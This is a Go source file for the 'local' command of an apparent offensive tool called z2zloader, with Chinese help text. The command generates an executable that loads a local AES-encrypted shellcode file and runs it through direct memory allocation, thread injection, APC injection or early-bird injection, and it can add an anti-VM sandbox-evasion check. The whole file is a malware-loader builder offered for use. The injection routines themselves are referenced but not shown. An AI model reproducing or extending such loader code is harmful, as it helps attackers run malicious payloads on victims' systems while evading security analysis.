/*
Copyright © 2024 NAME HERE <EMAIL ADDRESS>
*/
package cmd

import (
	"fmt"
	"github.com/spf13/cobra"
	"z2zloader/tools"
)

// localCmd represents the local command
var localCmd = &cobra.Command{
	Use:   "local",
	Short: "本地加载shellcode",
	Long: `执行本地加密过的aes-shellcode   For example:
.\z2zloader local -f file_path -m 1`,
	Run: func(cmd *cobra.Command, args []string) {
		sandbox, _ := rootCmd.PersistentFlags().GetBool("sandbox")
		fp, _ := cmd.Flags().GetString("file")
		module, _ := cmd.Flags().GetString("module")
		outputname, _ := cmd.Flags().GetString("output")
		fmt.Println("调用本地加载模块")
		switch module {
		case "1":
			if sandbox {
				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.AntiVM()"+"\n\t"+"tools.OriginalLoader(\"%v\")", fp))
			} else {
				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.OriginalLoader(\"%v\")", fp))
			}
		case "2":
			if sandbox {
				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.AntiVM()"+"\n\t"+"tools.DirectShellcodeInject(\"%v\")", fp))
			} else {
				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.DirectShellcodeInject(\"%v\")", fp))
			}
		case "3":
			if sandbox {
				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.AntiVM()"+"\n\t"+"tools.ApcShellcodeInject(\"%v\")", fp))
			} else {
				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.ApcShellcodeInject(\"%v\")", fp))
			}
		case "4":
			if sandbox {
				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.AntiVM()"+"\n\t"+"tools.EarlybirlInject(\"%v\")", fp))
			} else {
				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.EarlybirlInject(\"%v\")", fp))
			}
		}
	},
}

func init() {
	rootCmd.AddCommand(localCmd)
	localCmd.Flags().StringP("file", "f", "", "加载本地shellcode文件,请用类似\"E:\\test\\shellcode\\output.bin\"的格式插入")
	localCmd.Flags().StringP("module", "m", "1", "选择shellcode加载方式,1为直接内存分配,2为线程注入,3为apc注入，4为earybirl注入，推荐使用1和4")
	localCmd.MarkFlagRequired("file")
	localCmd.Flags().StringP("output", "o", "z2z.exe", "输出文件的名字")
	// localCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
}
